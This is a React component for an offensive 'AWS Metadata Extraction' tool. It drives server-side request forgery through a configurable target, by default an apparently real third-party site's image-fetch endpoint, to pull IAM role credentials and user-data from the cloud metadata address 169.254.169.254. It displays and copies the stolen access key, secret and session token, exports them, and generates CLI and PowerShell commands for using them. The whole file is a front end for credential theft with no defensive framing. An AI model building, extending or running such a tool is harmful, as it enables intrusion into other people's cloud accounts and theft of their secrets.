import React, { useState, useEffect, useRef } from 'react';
import { awsMetadataService, SSRFResult, AWSCredentials } from '../../src/services/awsMetadataService';

const AWSMetadataTool: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'extraction' | 'credentials' | 'commands' | 'results'>('extraction');
  const [isExtracting, setIsExtracting] = useState(false);
  const [results, setResults] = useState<SSRFResult[]>([]);
  const [currentCredentials, setCurrentCredentials] = useState<AWSCredentials | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [baseUrl, setBaseUrl] = useState('https://partidulaur.ro/api/fetch_image');
  const logsRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (logsRef.current) {
      logsRef.current.scrollTop = logsRef.current.scrollHeight;
    }
  }, [logs]);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  const handleFullExtraction = async () => {
    setIsExtracting(true);
    addLog('Starting full AWS metadata extraction...');

    try {
      const extraction = await awsMetadataService.fullAWSExtraction();
      
      setResults(awsMetadataService.getResults());
      
      // Extract credentials if successful
      if (extraction.credentials.success && extraction.credentials.response) {
        const creds = extraction.credentials.response as AWSCredentials;
        setCurrentCredentials(creds);
        addLog(`✅ Credentials extracted: ${creds.AccessKeyId.substring(0, 8)}...`);
      }

      addLog('Extraction complete');
      
    } catch (error: any) {
      addLog(`❌ Extraction failed: ${error.message}`);
    } finally {
      setIsExtracting(false);
    }
  };

  const handleQuickExtraction = async () => {
    setIsExtracting(true);
    addLog('Quick AWS credentials extraction...');

    try {
      const result = await awsMetadataService.extractAWSCredentials();
      setResults(awsMetadataService.getResults());
      
      if (result.success && result.response) {
        const creds = result.response as AWSCredentials;
        setCurrentCredentials(creds);
        addLog(`✅ Credentials extracted: ${creds.AccessKeyId.substring(0, 8)}...`);
      } else {
        addLog('❌ Failed to extract credentials');
      }
      
    } catch (error: any) {
      addLog(`❌ Extraction failed: ${error.message}`);
    } finally {
      setIsExtracting(false);
    }
  };

  const handleIAMRoleExtraction = async () => {
    setIsExtracting(true);
    addLog('Extracting IAM role...');

    try {
      const roleResult = await awsMetadataService.getIAMRole();
      setResults(awsMetadataService.getResults());
      
      if (roleResult.success && roleResult.response) {
        const roleName = roleResult.response as string;
        addLog(`✅ IAM Role found: ${roleName.trim()}`);
        
        // Now get credentials for this role
        addLog('Extracting credentials for role...');
        const credResult = await awsMetadataService.extractCredentialsForRole(roleName.trim());
        
        if (credResult.success && credResult.response) {
          const creds = credResult.response as AWSCredentials;
          setCurrentCredentials(creds);
          addLog(`✅ Credentials extracted: ${creds.AccessKeyId.substring(0, 8)}...`);
        }
      } else {
        addLog('❌ Failed to extract IAM role');
      }
      
    } catch (error: any) {
      addLog(`❌ Extraction failed: ${error.message}`);
    } finally {
      setIsExtracting(false);
    }
  };

  const handleValidateCredentials = () => {
    if (!currentCredentials) return;

    const validation = awsMetadataService.validateCredentials(currentCredentials);
    
    if (validation.isValid) {
      addLog('✅ Credentials are valid');
    } else {
      addLog('❌ Credential issues detected:');
      validation.issues.forEach(issue => addLog(`   - ${issue}`));
    }

    if (validation.recommendations.length > 0) {
      addLog('📋 Recommendations:');
      validation.recommendations.forEach(rec => addLog(`   - ${rec}`));
    }
  };

  const handleExportResults = () => {
    const data = awsMetadataService.exportResults();
    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `aws_metadata_extraction_${new Date().toISOString().split('T')[0]}.json`;
    a.click();
    URL.revokeObjectURL(url);
    addLog('Results exported');
  };

  const handleClearResults = () => {
    awsMetadataService.clearResults();
    setResults([]);
    setCurrentCredentials(null);
    addLog('Results cleared');
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      addLog('Copied to clipboard');
    });
  };

  const validation = currentCredentials ? awsMetadataService.validateCredentials(currentCredentials) : null;

  return (
    <div className="p-4 space-y-4 bg-black border border-orange-900/30 rounded-lg">
      <div className="flex items-center justify-between mb-4">
        <h2 className="text-lg font-black text-orange-400 uppercase tracking-tighter">
          <i className="fab fa-aws mr-2"></i>AWS Metadata Extraction
        </h2>
        <div className="flex items-center gap-2">
          <span className={`px-2 py-1 rounded text-xs font-bold ${
            currentCredentials ? 'bg-green-500/20 text-green-400' : 'bg-gray-500/20 text-gray-400'
          }`}>
            {currentCredentials ? 'CREDS EXTRACTED' : 'NO CREDS'}
          </span>
        </div>
      </div>

      {/* Configuration */}
      <div className="bg-black/40 border border-orange-900/20 rounded p-3">
        <label className="text-orange-400 text-xs font-black uppercase block mb-2">
          <i className="fas fa-cog mr-1"></i>SSRF Target Configuration
        </label>
        <input
          type="text"
          value={baseUrl}
          onChange={e => setBaseUrl(e.target.value)}
          placeholder="SSRF target URL..."
          className="w-full bg-black border border-orange-900/30 rounded px-3 py-2 text-orange-400 font-mono text-sm outline-none focus:border-orange-500/50"
        />
        <p className="text-gray-500 text-xs mt-1">Target: {baseUrl}</p>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 mb-4">
        {(['extraction', 'credentials', 'commands', 'results'] as const).map(tab => (
          <button
            key={tab}
            onClick={() => setActiveTab(tab)}
            className={`px-3 py-1 rounded text-xs font-black uppercase transition-all ${
              activeTab === tab
                ? 'bg-orange-600 text-white'
                : 'bg-black border border-orange-900/30 text-orange-400 hover:bg-orange-900/20'
            }`}
          >
            <i className={`fas fa-${tab === 'extraction' ? 'download' : tab === 'credentials' ? 'key' : tab === 'commands' ? 'terminal' : 'list'} mr-1`}></i>
            {tab}
          </button>
        ))}
      </div>

      {/* Extraction Tab */}
      {activeTab === 'extraction' && (
        <div className="space-y-3">
          <h3 className="text-orange-400 text-sm font-black uppercase">Metadata Extraction</h3>
          
          <div className="grid grid-cols-1 gap-2">
            <button
              onClick={handleFullExtraction}
              disabled={isExtracting}
              className="py-2 bg-orange-600 hover:bg-orange-500 text-white text-xs font-black uppercase rounded transition-all disabled:opacity-50"
            >
              {isExtracting ? (
                <>
                  <i className="fas fa-spinner fa-spin mr-1"></i>Extracting...
                </>
              ) : (
                <>
                  <i className="fas fa-download mr-1"></i>Full Extraction
                </>
              )}
            </button>
            
            <button
              onClick={handleQuickExtraction}
              disabled={isExtracting}
              className="py-2 bg-yellow-600 hover:bg-yellow-500 text-white text-xs font-black uppercase rounded transition-all disabled:opacity-50"
            >
              <i className="fas fa-bolt mr-1"></i>Quick Credentials
            </button>
            
            <button
              onClick={handleIAMRoleExtraction}
              disabled={isExtracting}
              className="py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-black uppercase rounded transition-all disabled:opacity-50"
            >
              <i className="fas fa-user-shield mr-1"></i>IAM Role First
            </button>
          </div>

          <div className="bg-black/40 border border-orange-900/20 rounded p-2">
            <h4 className="text-orange-400 text-xs font-black uppercase mb-2">Extraction Targets</h4>
            <div className="space-y-1 text-xs text-gray-400">
              <div>• http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
              <div>• http://169.254.169.254/latest/meta-data/</div>
              <div>• http://169.254.169.254/latest/user-data/</div>
            </div>
          </div>
        </div>
      )}

      {/* Credentials Tab */}
      {activeTab === 'credentials' && (
        <div className="space-y-3">
          <h3 className="text-orange-400 text-sm font-black uppercase">Extracted Credentials</h3>
          
          {currentCredentials ? (
            <div className="space-y-3">
              <div className="bg-black/40 border border-orange-900/20 rounded p-3">
                <h4 className="text-orange-400 text-xs font-black uppercase mb-2">AWS Credentials</h4>
                <div className="space-y-2 text-xs">
                  <div>
                    <span className="text-gray-400">Access Key ID:</span>
                    <div className="font-mono text-orange-400">{currentCredentials.AccessKeyId}</div>
                  </div>
                  <div>
                    <span className="text-gray-400">Secret Access Key:</span>
                    <div className="font-mono text-orange-400 break-all">{currentCredentials.SecretAccessKey}</div>
                  </div>
                  <div>
                    <span className="text-gray-400">Session Token:</span>
                    <div className="font-mono text-orange-400 break-all">{currentCredentials.Token}</div>
                  </div>
                  <div>
                    <span className="text-gray-400">Type:</span>
                    <span className="text-orange-400 ml-2">{currentCredentials.Type}</span>
                  </div>
                  <div>
                    <span className="text-gray-400">Last Updated:</span>
                    <span className="text-orange-400 ml-2">{currentCredentials.LastUpdated}</span>
                  </div>
                </div>
                
                <div className="flex gap-2 mt-3">
                  <button
                    onClick={() => copyToClipboard(currentCredentials.AccessKeyId)}
                    className="px-2 py-1 bg-orange-600/20 border border-orange-600 text-orange-400 text-xs rounded hover:bg-orange-600/30"
                  >
                    <i className="fas fa-copy mr-1"></i>Copy AKI
                  </button>
                  <button
                    onClick={() => copyToClipboard(currentCredentials.SecretAccessKey)}
                    className="px-2 py-1 bg-orange-600/20 border border-orange-600 text-orange-400 text-xs rounded hover:bg-orange-600/30"
                  >
                    <i className="fas fa-copy mr-1"></i>Copy Secret
                  </button>
                  <button
                    onClick={() => copyToClipboard(currentCredentials.Token)}
                    className="px-2 py-1 bg-orange-600/20 border border-orange-600 text-orange-400 text-xs rounded hover:bg-orange-600/30"
                  >
                    <i className="fas fa-copy mr-1"></i>Copy Token
                  </button>
                  <button
                    onClick={handleValidateCredentials}
                    className="px-2 py-1 bg-green-600/20 border border-green-600 text-green-400 text-xs rounded hover:bg-green-600/30"
                  >
                    <i className="fas fa-check mr-1"></i>Validate
                  </button>
                </div>
              </div>

              {validation && (
                <div className={`bg-black/40 border rounded p-3 ${
                  validation.isValid ? 'border-green-900/20' : 'border-red-900/20'
                }`}>
                  <h4 className={`text-xs font-black uppercase mb-2 ${
                    validation.isValid ? 'text-green-400' : 'text-red-400'
                  }`}>
                    Validation {validation.isValid ? '✅ Passed' : '❌ Issues'}
                  </h4>
                  {validation.issues.length > 0 && (
                    <div className="space-y-1">
                      {validation.issues.map((issue, i) => (
                        <div key={i} className="text-xs text-red-400">• {issue}</div>
                      ))}
                    </div>
                  )}
                  {validation.recommendations.length > 0 && (
                    <div className="space-y-1 mt-2">
                      {validation.recommendations.map((rec, i) => (
                        <div key={i} className="text-xs text-yellow-400">💡 {rec}</div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </div>
          ) : (
            <div className="text-center text-gray-500 py-8">
              <i className="fas fa-key text-4xl mb-2"></i>
              <p>No credentials extracted yet</p>
              <p className="text-xs">Run an extraction to get AWS credentials</p>
            </div>
          )}
        </div>
      )}

      {/* Commands Tab */}
      {activeTab === 'commands' && (
        <div className="space-y-3">
          <h3 className="text-orange-400 text-sm font-black uppercase">AWS CLI Commands</h3>
          
          {currentCredentials ? (
            <div className="space-y-3">
              <div className="bg-black/40 border border-orange-900/20 rounded p-3">
                <h4 className="text-orange-400 text-xs font-black uppercase mb-2">Linux/macOS Commands</h4>
                <div className="bg-black/60 border border-orange-900/10 rounded p-2">
                  <pre className="text-xs text-green-400 font-mono whitespace-pre-wrap">
                    {awsMetadataService.generateAWSCommands(currentCredentials).join('\n')}
                  </pre>
                </div>
                <button
                  onClick={() => copyToClipboard(awsMetadataService.generateAWSCommands(currentCredentials).join('\n'))}
                  className="mt-2 px-3 py-1 bg-orange-600 hover:bg-orange-500 text-white text-xs font-black uppercase rounded transition-all"
                >
                  <i className="fas fa-copy mr-1"></i>Copy Commands
                </button>
              </div>

              <div className="bg-black/40 border border-orange-900/20 rounded p-3">
                <h4 className="text-orange-400 text-xs font-black uppercase mb-2">PowerShell Commands</h4>
                <div className="bg-black/60 border border-orange-900/10 rounded p-2">
                  <pre className="text-xs text-blue-400 font-mono whitespace-pre-wrap">
                    {awsMetadataService.generatePowerShellCommands(currentCredentials).join('\n')}
                  </pre>
                </div>
                <button
                  onClick={() => copyToClipboard(awsMetadataService.generatePowerShellCommands(currentCredentials).join('\n'))}
                  className="mt-2 px-3 py-1 bg-orange-600 hover:bg-orange-500 text-white text-xs font-black uppercase rounded transition-all"
                >
                  <i className="fas fa-copy mr-1"></i>Copy PowerShell
                </button>
              </div>
            </div>
          ) : (
            <div className="text-center text-gray-500 py-8">
              <i className="fas fa-terminal text-4xl mb-2"></i>
              <p>No credentials available for commands</p>
              <p className="text-xs">Extract credentials first to generate AWS CLI commands</p>
            </div>
          )}
        </div>
      )}

      {/* Results Tab */}
      {activeTab === 'results' && (
        <div className="space-y-3">
          <div className="flex justify-between items-center">
            <h3 className="text-orange-400 text-sm font-black uppercase">Extraction Results</h3>
            <div className="flex gap-2">
              <button
                onClick={handleExportResults}
                className="px-3 py-1 bg-orange-600 hover:bg-orange-500 text-white text-xs font-black uppercase rounded transition-all"
              >
                <i className="fas fa-download mr-1"></i>Export
              </button>
              <button
                onClick={handleClearResults}
                className="px-3 py-1 bg-red-600 hover:bg-red-500 text-white text-xs font-black uppercase rounded transition-all"
              >
                <i className="fas fa-trash mr-1"></i>Clear
              </button>
            </div>
          </div>
          
          <div className="space-y-2 max-h-64 overflow-y-auto">
            {results.length === 0 ? (
              <div className="text-center text-gray-500 py-8">
                <i className="fas fa-list text-4xl mb-2"></i>
                <p>No results yet</p>
                <p className="text-xs">Run an extraction to see results</p>
              </div>
            ) : (
              results.map((result, index) => (
                <div key={index} className="bg-black/40 border border-orange-900/20 rounded p-2">
                  <div className="flex items-center justify-between mb-1">
                    <span className={`px-2 py-0.5 rounded text-xs font-bold ${
                      result.success ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'
                    }`}>
                      {result.success ? 'SUCCESS' : 'FAILED'}
                    </span>
                    <span className="text-gray-500 text-xs">
                      {result.timestamp.toLocaleTimeString()}
                    </span>
                  </div>
                  
                  <div className="text-xs text-gray-400 mb-1">
                    <span className="text-orange-400">{result.method}</span> {result.url}
                    <span className="ml-2">Status: {result.status}</span>
                  </div>
                  
                  {result.response && (
                    <div className="text-xs text-gray-300">
                      {typeof result.response === 'string' ? (
                        <pre className="whitespace-pre-wrap">{result.response.substring(0, 200)}{result.response.length > 200 ? '...' : ''}</pre>
                      ) : (
                        <pre className="whitespace-pre-wrap">{JSON.stringify(result.response, null, 2).substring(0, 200)}...</pre>
                      )}
                    </div>
                  )}
                  
                  {result.error && (
                    <div className="text-xs text-red-400">
                      Error: {result.error}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* System Logs */}
      <div className="bg-black/40 border border-orange-900/20 rounded p-3">
        <h3 className="text-orange-400 text-xs font-black uppercase mb-2">System Logs</h3>
        <div
          ref={logsRef}
          className="bg-black/60 border border-orange-900/10 rounded p-2 h-32 overflow-y-auto font-mono text-xs text-gray-400"
        >
          {logs.length === 0 ? (
            <div className="text-gray-600">No logs yet...</div>
          ) : (
            logs.map((log, i) => <div key={i}>{log}</div>)
          )}
        </div>
      </div>
    </div>
  );
};

export default AWSMetadataTool;
